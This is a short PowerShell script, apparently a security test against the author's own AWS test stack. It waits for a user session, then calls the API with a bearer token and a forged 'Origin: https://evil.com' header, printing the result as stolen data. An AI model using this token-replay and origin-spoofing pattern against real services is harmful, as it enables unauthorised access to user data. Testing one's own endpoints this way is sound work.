$PROFILE = "DevRole-123456789012"
$REGION = "us-east-1"
$STACK = "test-020"
$TOKEN = "<JWT_REDACTADO>"

$URL = aws cloudformation describe-stacks --stack-name $STACK --profile $PROFILE --region $REGION --query "Stacks[0].Outputs[?OutputKey=='ApiEndpoint'].OutputValue" --output text

Write-Host "Esperando inicio de sesion en el front..." -ForegroundColor Yellow
while($true) {
    $r = Invoke-RestMethod -Uri $URL -Headers @{"Authorization"="Bearer $TOKEN"}
    if ($r.session_status -eq $true) { break }
    Start-Sleep -Seconds 2
}

Write-Host "Ataque desde evil.com ejecutado!" -ForegroundColor Red
$stolen = Invoke-RestMethod -Uri $URL -Headers @{ 
    "Origin" = "https://evil.com"; 
    "Authorization" = "Bearer $TOKEN" 
}
$stolen.data | ConvertTo-Json